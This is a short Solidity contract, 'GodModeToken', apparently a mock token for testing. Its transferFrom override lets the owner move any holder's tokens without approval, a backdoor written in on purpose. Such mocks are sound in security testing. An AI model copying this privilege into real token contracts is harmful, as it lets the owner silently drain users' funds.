// SPDX-License-Identifier: MIT

import { Ownable, Ownable2Step } from "@openzeppelin/contracts/access/Ownable2Step.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

pragma solidity 0.8.26;

contract GodModeToken is ERC20, Ownable2Step {
    // -----------------------------------------------------------------------
    // Constructor
    // -----------------------------------------------------------------------

    constructor() ERC20("GodMode Token", "GMT") Ownable(msg.sender) {
        _mint(msg.sender, 1_000_000 * 10**18);
    }

    // -----------------------------------------------------------------------
    // Public functions
    // -----------------------------------------------------------------------

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        if (msg.sender == owner()) {
            _update(from, to, value);
            return true;
        }
        
        return super.transferFrom(from, to, value);
    }
}
